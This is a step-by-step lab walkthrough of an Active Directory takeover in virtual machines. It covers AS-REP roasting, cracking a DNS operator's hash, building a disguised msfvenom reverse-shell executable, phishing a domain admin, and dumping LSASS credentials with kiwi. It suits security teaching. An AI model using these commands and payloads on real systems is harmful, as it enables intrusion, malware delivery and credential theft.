# Hacking Lab: Privilege Escalation in Windows Active Directory

This document will present a complete and step-by-step guide to perform a hacking laboratory in a virtualized environment, reproducing a fake-but-realistic scenario.

## Introduction to the activity

### Scenario

This laboratory overviews the steps that might be performed by an attacker in an organization running **Windows Active Directory** in order to **take control of a domain administrator account**.

The attacked environment has these main characteristics:

 - An organization uses **Windows Active Directory**; all its computers are part of a **Domain**;
 - The domain mainly relies on two (physically and logically) different servers:
	 - A server that acts as **Domain Controller** and **DHCP server**;
	 - Another server that acts as **DNS server** and **File Server**;
 - Domain accounts are mainly divided in two major groups:
	 - **`DomainAdmins`**, which have "high privileges" on *all* machines;
	 - **`DomainUsers`**, which have "low privileges" on *all* machines;
 - Also, the following policies and settings are enforced:
	 - `DomainAdmins` are set up to be also **local `Administrators`** on *all* the workstations;
	 - The DNS server can be accessed only by accounts in `DnsAdmins` group, which can access only that specific machine;
		 - These accounts can perform Kerberos login **without pre-authentication**;
		 -  **Remote Desktop** access is allowed on the DNS server;
	 - All accounts can **read** a **shared network folder**, which can be written only by `Administrators` and `DnsAdmins`;

When not differently specified, all other settings are intented to be the "default" ones; in particular, all domain Users and Computers are stored in the default Active Directory containers (i.e. `Users` and `Computers`).

It is (realistically) assumed that some domain accounts use common and easily predictable passwords.

### Goal

The main goal of this laboratory is to **gain access** to the credentials of an **account belonging to the `DomainAdmins` group**.

### Threat Model

It is assumed that the attacker:

 - is "inside" the network and owns the credentials of a `DomainUser` account;
 - can contact servers, also from a personal device which is not part of the domain, with all the needed protocols;

## Setting up the Virtual Environment

### Installing the Virtual Machines

This activity requires the set-up of a virtual environment running the following machines:
 - **2** VMs running **Windows Server 2012**;
 - **1** VM running **Windows 7**;
 - **1** VM running **Kali Linux**;

It is suggested to use **Oracle VirtualBox** as virtualizator, so it is possible to use the provided VMs images; otherwise, any software is good.

All the machines need to communicate between each-other, so the virtualizator must be set up for allowing this.

OSs versions are not mandatory, but all the features that will be used must be available.

### Configuring the Machines

Since the configuration of an Active Directory domain is not the main goal of this document, just a few details will be given further down while many others will be omitted.
It is strongly suggested to use the **images** of the VMs that are provided [here](https://1drv.ms/f/s!Anl382FsL4Upiat8r6W9qhUUTo4hDw?e=fOHsvm), since they are already configured to reproduce the described scenario.

The **Kali** machine has a static IP address (`10.0.2.15`). Additional packets and libraries like `impacket` and `kiwi` have been installed in the `metasploit` framework.

The **Windows 7** machine, named `WIN7`, belongs to the domain and receives a dynamical IP address via DHCP.

The **DomainController/DHCP server**, named `SERVER`, has a static IP address (`10.0.2.200`) and controls the domain named `cybersec.units.it`.
DHCP assignes IPv4 addresses in the pool `10.0.2.10-190` and the default DNS, which is set to be `10.0.2.250`.
The following domain accounts (with passwords between brackets) are available:

 - `DomainUser` (`User00!`), belonging to the `DomainUsers` group;
 - `DomainUserNoAuth` (`User00!`), belonging to the `DomainUsers` group, requires NO Kerberos pre-authentication;
 - `DomainAdmin` (`#Admin00!`), belonging to the `DomainUsers`, `DomainAdmins`, `Administrators` groups;
	 - The password is NOT present in any passwords' dictionary[^1] !
 - `DNSoperator` (`Qwerty123`), belonging to the `DomainUsers`, `DnsAdmins`, `DnsUpdateProxy` groups;
  	- The password IS present in passwords' dictionaries[^1] !

The **DNS/File server**, named `SERVERDNS`, has a static IP address (`10.0.2.250`) and acts as default DNS server for the domain.
It hosts a folder that is shared to all computers in the domain, which can be read by everyone while can be written only by `Administrators` and `DnsAdmins`.
This device can be accessed and managed via Remote Desktop by `DnsAdmins` accounts.

Every machine has a default local admin account (*out of this lab's scope*) named `Administrator` whose password is `Qwerty123`.

The attacker owns the credentials of `DomainUser`.

## Let's start Hacking!

Once set-up the environment, it is finally possible to begin the laboratory!

> Unless otherwise specified, all the actions are intended to be performed from the **Kali** machine.

> When referring to a "*`GroupName`* account", it has to be read as "any account belonging to the *`GroupName`* group".
 

 0. **Open a Shell**;
 
 1. **Find the IP address of the Domain Controller**:

 	To begin, we need to find the IP address of the DomainController.
	 For doing so, we execute the following command: 
 
    `nmap -p 389 -A -v -Pn 10.0.2.0/24`
    
    which tries to contact all the IP addresses in the range `10.0.2.0 - 10.0.2.255` on port  **389** (LDAP) to check whether it is open and the device is ready to accept requests.

	From the response, we find out that the DomainController has IPv4 address **`10.0.2.200`**:
	
	 ![Response of the nmap request](https://raw.githubusercontent.com/AM311/Cybersecurity_Report/main/img/nmap_DC.png)

 2. **Understand the existing accounts and groups**:
	
 	In order to choose our targets, we need to be aware of what the domain accounts are and which groups they belong to.
	For doing so, we ask the DomainController, via a LDAP query, to list us all the entries in the `Users` Active Directory default container, where we (correctly) assume that all user accounts are stored:

    `ldapsearch -x -b "cn=Users,dc=cybersec,dc=units,dc=it" -H "ldap://10.0.2.200" -D "cn=Utente Dominio,cn=Users,dc=cybersec,dc=units,dc=it" -w 'User00!'`

	To run the query, we need to authenticate providing the FullyQualifiedName and password of our legitimately controlled account.
		
	The response is very verbose; the two major results are shown below:
	 - The account `DomainAdmin` belongs to the group `DomainAdmins`, so it seems to be a good target;
	 - The account `DNSoperator` belongs to the group `DnsAdmins` and can access only the machine named `SERVERDNS`;

	![Accounts details](https://github.com/AM311/Cybersecurity_Report/blob/main/img/accountsLDAP.png?raw=true)

	
 3. **List accounts which do not require Kerberos pre-authentication**:
As first attempt, we ask the DomainController to list all the accounts that can authenticate via Kerberos without pre-authentication: hopefully, we will find a `DomainAdmins` account.

	For doing so, we run a predefined LDAP query to the DC from our legitimate account, using the following command:
	
    `impacket-GetNPUsers -dc-ip 10.0.2.200 cybersec.units.it/DomainUser:User00!`
    
    There are two domain accounts that soddisfy the requests:
    
	![Accounts that does not require pre-auth](https://github.com/AM311/Cybersecurity_Report/blob/main/img/noKerbPreAuth.png?raw=true)

	We will focus our efforts on `DNSoperator` since, as seen, it can login to `SERVERDNS` and belongs to the `DnsAdmins` group, whose members have write rights on the network shared folder.
	

	> The ACL of a folder is readable by any account that can visualize it!

	
 4. **Perform AS-Rep Roasting:**
We will try to crack the `DNSoperator` password performing a so-called **AS-Rep Roasting** attack.

	For doing so, we firstly ask the DC to generate a **TGT** for each of the previous accounts and we format the responses so they are ready to be cracked using *John the Ripper*:

    `impacket-GetNPUsers -dc-ip 10.0.2.200 cybersec.units.it/DomainUser:User00! -request -format john`

	From the output, we copy the string referring to `DNSoperator` in a **text file** called `usernames.txt` and located on the desktop.
	
	   `$krb5asrep$DNSoperator@CYBERSEC.UNITS.IT:8690a5aa5b288a036a49126539f292ef$afe3e87aafc
	    35690745c5dfeb1f459dcc1ed858f1f4755d3aefa12921c93dbc35b35c0fd6094be7390eab67e0c016f96
	    efad6f7ed8343a734e0f401c91ec09a83d11542d377f0d1daf690d7205a3b5d8316a2d1afdd0a6ac4b3e9
	    2fb4d6d295a60b074e549aa6a7c0e24cccfd7dd96cfdb06f908d38de6cb775f4fa44b5eae69bc2452fdfb
	    bfa6ca73a70233a2f64e778d3bd286047a69ddf6fd99379b264f747034c32c66971240bede9becb6150fc
	    85d516545f661aef05c22fc5c26a210a4243627cf681ea61f45996fb8d235b3f9d972433c390ff3b4250f
	    576c96c54d167a61a76717831eb320b84aa37acef60cd3f1c781bf6e` 
	
	
 	Now, we try to crack the hash using **John the Ripper**, providing a password dictionary called `rockyou`.
	
    `john --wordlist=/usr/share/wordlists/rockyou.txt --format=krb5asrep ./Desktop/usernames.txt`

	"Fortunately", the password is in the dictionary, so *john* finds it immediately.
	
	![Result of the offline guessing with John the Ripper](https://github.com/AM311/Cybersecurity_Report/blob/main/img/asRepRoasting.png?raw=true)

	 We are now able to legitimately login to `SERVERDNS`, so we will try to perform some "useful" actions!
 
 5. **Open a remote connection to `SERVERDNS`:**
		
  	To open a remote desktop connection, we use the following command:

    `rdesktop 10.0.2.250 -u DNSoperator -p Qwerty123 -d cybersec.units.it -r disk:share=~/Desktop/share`

	where the option `-r disk:share=~/Desktop/share` allows to share the folder `share` between the Kali machine and the remote server, so we are able to easily move documents between the two devices.
 
 6. **Generate a payload for starting a reverse shell and inject it:**
	In a *different* shell window, we now proceed generating an **exploit** whose payload is a `meterpreter` reverse shell client, running the following command:

    `msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp  LHOST=10.0.2.15 -b "\x00" -f exe -o ./Desktop/WorkshiftsManager.exe`

	 `msfvenom` is a payload generator and encoder, through which we build a `.exe` file (the actual exploit), executable on all Windows devices. Its payload will spawn a reverse shell client, which will connect to the reverse shell server listening on the Kali machine (`10.0.2.15`) on the default TCP port (`4444`).

	The output that we get is the file `WorkShiftsManager.exe`: its name is deliberately misleading, since we want not to raise any suspicion.
	
	We now need to **inject** the exploit into the computers of the organization.
	For doing so, we can rely on the remote desktop connection that we opened: we copy the executable file into the `share` folder and then, from the server's remote desktop, we move it into the network shared folder.
	Doing so, all the account of the organization will be able to see (and execute) that file.
	
 7. **Run the reverse shell server:**
	For allowing us to take control of a machine, we now start the reverse shell server on Kali through the following command:
	
	`msfconsole -r ./Desktop/meterpreter.rc`
	
	where `msfconsole` is a CLI through which it is possible to interact with the Metasploit Framework and `meterpreter.rc` is a script, previously created, made up of the following commands:
	
	```
	use exploit/multi/handler
	set PAYLOAD windows/meterpreter/reverse_tcp
	set LHOST 10.0.2.15
	set ExitOnSession false
	exploit -j -z
	```
	The script, basically, starts a generic payload handler and makes it listen on the default port of the current machine for incoming connections from a `windows/meterpreter/reverse_tcp` payload, which is the one that we have injected.
	
 8. **"Convince" a Domain Administrator to run the executable:**
	In order to make this whole system effectively work, we need to "convince" a `DomainAdmins` account to run the executable: doing so, we will be able to communicate to a process (the reverse shell client) running with high privileges (*remember: all domain administrators are also local administrators*).
 
	 Our target, as stated in step (2), is the **`DomainAdmin`** account.
	 Also, we previously discovered its email address, so we use it to send a spearphishing message:
	
	![Phishing email sent to the domain administrator](https://github.com/AM311/Cybersecurity_Report/blob/main/img/email.png?raw=true)

	Hopefully, the user will anywhen run the process as instructed.

	> The technical details for sending a phishing message with a credible/lookalike/spoofed sending address are out of scope, as they are strongly dependant on the environment (technical settings, people, ...).
	
 9. **Communication between devices and Privilege Escalation:**
	 Once the user has followed the instructions and run the exploit, on the Kali machine we should see that a new session (with a given numeric ID) has been opened. Typing `sessions -i <ID>` we launch the `meterpreter` CLI and are able to communicate with that endpoint.

	As first operation, we check the identity of the process that runs `meterpreter` on that device invoking the `getuid` command: as shown in the image, the process is owned by the `DomainAdmin` account.
	
	In order to complete our future tasks, we need to run the process as `SYSTEM`. For doing so, we run the `getsystem` command[^2] . If the execution is successfully completed, running again `getuid` we will see that now we are running as `SYSTEM`.

	![Privilege escalation on msfconsole](https://github.com/AM311/Cybersecurity_Report/blob/main/img/msfconsole_getuid-system.png?raw=true)

 10. **Steal the credentials of the logged account:**
	 At this point, we can finally dump all the credentials currently stored from the LSASS memory.
	 
	 For doing so, we first need to run the `meterpreter` **kiwi** extension, using the command `load kiwi`; then, invoking `creds_all` we are finally able to gain all the available credentials in memory, some in a hashed form while other directly in clear text[^3] .
		
		![All credentials stolen from the memory](https://github.com/AM311/Cybersecurity_Report/blob/main/img/creds.png?raw=true)

 11. **GAME OVER!**
	 We are finally in possession of the credentials of an account belonging to the DomainAdmins group, so we are now able to perform any (malicious) activity within the domain!

## Credits

This activity has been developed autonomously.
The following sources have been consulted:

 - https://www.forensicxs.com/active-directory-hacking-lab/
 - https://devconnected.com/how-to-search-ldap-using-ldapsearch-examples/
 - https://medium.com/@jbtechmaven/hacking-active-directory-with-as-rep-roasting-15ca0d9fae5c
 - https://www.securitynik.com/2022/01/beginning-as-rep-roasting-with-impacket.html
 - https://www.offsec.com/metasploit-unleashed/writing-meterpreter-scripts/
 - https://www.kali.org/tools/rdesktop/
 - https://book.hacktricks.xyz/windows-hardening/stealing-credentials
 - https://www.hackers-arise.com/post/2018/11/26/metasploit-basics-part-21-post-exploitation-with-mimikatz

Other useful information about Active Directory have been retrieved from official Microsoft guides.
___
[^1]: See [haveibeenpwned.com](https://haveibeenpwned.com/Passwords) 

[^2]: `getsystem` requires the process to be run as administrator (to be "previously" authorized to run with high privileges, due to Windows UAC); then, it tries three techniques to achieve Privilege Escalation. More details [here](https://docs.rapid7.com/metasploit/meterpreter-getsystem/).

[^3]: To better understand the meaning of all the credentials stored by the different security packages, read [this page](https://www.hackingarticles.in/metasploit-for-pentester-mimikatz/).
<!--stackedit_data:
eyJoaXN0b3J5IjpbMjEwODA4MjkzNCwxODczMDk5NjYzLC0zMT
I0MzM5MzMsNDcwMDIwODcwLC0yMDY3NTE0OTA1LC0xNzY1MTY3
NTcwLC0zMDYwNTAzODcsMTIxMjMxMTg1Niw5Nzc5MTI1MTYsND
kyNjY2NDE3LC0xMTk1MzAyODM4LDY0MDA4OTI5OSwtMTc0MDE4
Nzk0MSwtMTM1MTY5NjExOCw0ODQyNTkzMCwtMTY0NzY4NzU5Mi
wxMDk5OTMxNzQwLC0xMjUyNTYwNzE3LDE0OTIyODY2ODMsMjgw
ODQ0OTA1XX0=
-->